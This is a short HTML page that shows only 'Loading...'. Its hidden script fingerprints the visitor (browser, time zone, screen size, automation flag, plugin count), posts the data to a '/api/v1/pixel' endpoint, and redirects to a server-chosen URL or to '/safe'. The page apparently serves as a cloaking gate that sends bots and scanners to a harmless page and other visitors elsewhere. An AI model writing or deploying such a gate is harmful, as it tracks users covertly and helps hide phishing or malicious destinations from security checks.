<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>
<style>
body { margin: 0; background: #0d0010; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; color: #888; font-size: 1rem; }
</style>
<script>
(function() {
  var xhr = new XMLHttpRequest();
  xhr.open('POST', '/api/v1/pixel', true);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.timeout = 7000;
  xhr.ontimeout = xhr.onerror = function() {
    window.location.href = '/safe';
  };
  xhr.onload = function() {
    try {
      var r = JSON.parse(xhr.responseText);
      window.location.href = r.url || '/safe';
    } catch(e) {
      window.location.href = '/safe';
    }
  };
  xhr.send(JSON.stringify({
    ua: navigator.userAgent,
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    sw: screen.width,
    sh: screen.height,
    wd: navigator.webdriver || false,
    pl: navigator.plugins ? navigator.plugins.length : 0
  }));
})();
</script>
</head>
<body>Loading...</body>
</html>
